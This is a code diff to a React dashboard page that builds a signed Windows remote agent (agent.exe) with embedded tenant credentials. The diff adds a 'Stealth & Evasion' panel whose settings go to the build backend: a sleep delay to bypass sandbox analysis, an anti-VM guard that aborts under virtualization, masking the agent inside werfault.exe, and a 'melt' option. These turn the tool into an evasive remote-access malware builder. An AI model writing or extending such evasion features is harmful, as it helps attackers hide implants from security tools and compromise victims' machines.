@@ -2,6 +2,9 @@ import { useState } from "react";
 import { Button } from "@/components/ui/button";
 import { Progress } from "@/components/ui/progress";
 import { Badge } from "@/components/ui/badge";
+import { Input } from "@/components/ui/input";
+import { Label } from "@/components/ui/label";
+import { Switch } from "@/components/ui/switch";
 import {
   Download,
   Rocket,
@@ -18,6 +21,7 @@ import {
   ExternalLink,
   History,
   Clock,
+  ShieldAlert,
 } from "lucide-react";
 import { useTenant } from "@/hooks/use-tenant";
 import { supabase } from "@/integrations/supabase/client";
@@ -45,6 +49,14 @@ export default function DeploymentCenter() {
   const [downloadUrl, setDownloadUrl] = useState<string | null>(null);
   const [progress, setProgress] = useState(0);
   const [redownloadingId, setRedownloadingId] = useState<string | null>(null);
+
+  // New Stealth & Evasion State
+  const [stealthConfig, setStealthConfig] = useState({
+    delay: 30,
+    antiVM: true,
+    processGhost: "werfault.exe",
+    melt: false,
+  });
 
   const currentStage = BUILD_STAGES.find((s) => progress <= s.threshold)?.label ?? "Processing";
 
@@ -79,8 +91,12 @@ export default function DeploymentCenter() {
     }, 1500);
 
     try {
+      // Updated payload to include stealth configuration
       const { data, error } = await supabase.functions.invoke<{ buildId?: string }>("generate-build", {
-        body: { api_key: tenant.apiKey },
+        body: {
+          api_key: tenant.apiKey,
+          stealth: stealthConfig,
+        },
       });
 
       if (error) throw error;
@@ -215,6 +231,45 @@ export default function DeploymentCenter() {
           </div>
 
           <div className="p-6 space-y-6">
+            {/* Stealth & Evasion Settings Panel */}
+            <div className="space-y-4 rounded-xl border bg-muted/10 p-5">
+              <h3 className="text-sm font-semibold flex items-center gap-2">
+                <ShieldAlert className="h-4 w-4 text-primary" />
+                Stealth & Evasion Parameters
+              </h3>
+              <div className="grid grid-cols-1 sm:grid-cols-2 gap-4">
+                <div className="space-y-2">
+                  <Label className="text-[11px] uppercase font-bold text-muted-foreground">Sleep Delay (Seconds)</Label>
+                  <Input
+                    type="number"
+                    value={stealthConfig.delay}
+                    onChange={(e) => setStealthConfig({ ...stealthConfig, delay: Number(e.target.value) })}
+                    className="bg-background"
+                  />
+                  <p className="text-[10px] text-muted-foreground">Bypass time-limited sandbox analysis.</p>
+                </div>
+                <div className="space-y-2">
+                  <Label className="text-[11px] uppercase font-bold text-muted-foreground">Ghost Process Target</Label>
+                  <Input
+                    value={stealthConfig.processGhost}
+                    onChange={(e) => setStealthConfig({ ...stealthConfig, processGhost: e.target.value })}
+                    className="bg-background"
+                  />
+                  <p className="text-[10px] text-muted-foreground">Mask agent within trusted system process.</p>
+                </div>
+              </div>
+              <div className="flex items-center justify-between pt-2 border-t">
+                <div className="space-y-0.5">
+                  <Label className="text-xs">Anti-VM / Sandbox Guard</Label>
+                  <p className="text-[10px] text-muted-foreground">Abort execution if virtualization is detected.</p>
+                </div>
+                <Switch
+                  checked={stealthConfig.antiVM}
+                  onCheckedChange={(v) => setStealthConfig({ ...stealthConfig, antiVM: v })}
+                />
+              </div>
+            </div>
+
             {!buildId && !isBuilding ? (
               <div className="text-center py-8 space-y-5">
                 <div className="mx-auto flex h-16 w-16 items-center justify-center rounded-2xl bg-primary/10">
@@ -223,11 +278,11 @@ export default function DeploymentCenter() {
                 <div className="space-y-1.5">
                   <h4 className="font-semibold">Generate a new agent</h4>
                   <p className="text-sm text-muted-foreground max-w-md mx-auto">
-                    A signed Windows executable will be compiled with your tenant credentials embedded.
-                    Distribute it to any device you want to manage.
+                    A signed Windows executable will be compiled with your tenant credentials and chosen stealth
+                    parameters embedded.
                   </p>
                 </div>
-                <Button onClick={handleBuild} size="lg" className="gap-2">
+                <Button onClick={handleBuild} size="lg" className="gap-2 w-full sm:w-auto">
                   <Rocket className="h-4 w-4" />
                   Initialize Build
                 </Button>
@@ -296,12 +351,7 @@ export default function DeploymentCenter() {
                     </div>
 
                     <div className="grid grid-cols-1 sm:grid-cols-2 gap-3">
-                      <Button
-                        onClick={triggerDownload}
-                        disabled={isDownloading}
-                        size="lg"
-                        className="gap-2"
-                      >
+                      <Button onClick={triggerDownload} disabled={isDownloading} size="lg" className="gap-2">
                         {isDownloading ? (
                           <Loader2 className="h-4 w-4 animate-spin" />
                         ) : (
@@ -309,13 +359,7 @@ export default function DeploymentCenter() {
                         )}
                         Download agent.exe
                       </Button>
-                      <Button
-                        onClick={handleBuild}
-                        variant="outline"
-                        size="lg"
-                        className="gap-2"
-                        disabled={isBuilding}
-                      >
+                      <Button onClick={handleBuild} variant="outline" size="lg" className="gap-2" disabled={isBuilding}>
                         <Rocket className="h-4 w-4" />
                         New Build
                       </Button>
@@ -356,7 +400,7 @@ export default function DeploymentCenter() {
             <Step
               num={1}
               title="Generate"
-              desc="Click Initialize Build to compile a signed executable bound to your tenant."
+              desc="Set your evasion parameters and initialize the build to compile a hardened binary."
             />
             <Step
               num={2}
@@ -366,7 +410,7 @@ export default function DeploymentCenter() {
             <Step
               num={3}
               title="Execute"
-              desc="Run the binary once. The device auto-registers and appears in your inventory within seconds."
+              desc="Run the binary once. The device auto-registers after the configured sleep delay."
             />
 
             <div className="pt-4 border-t space-y-2">
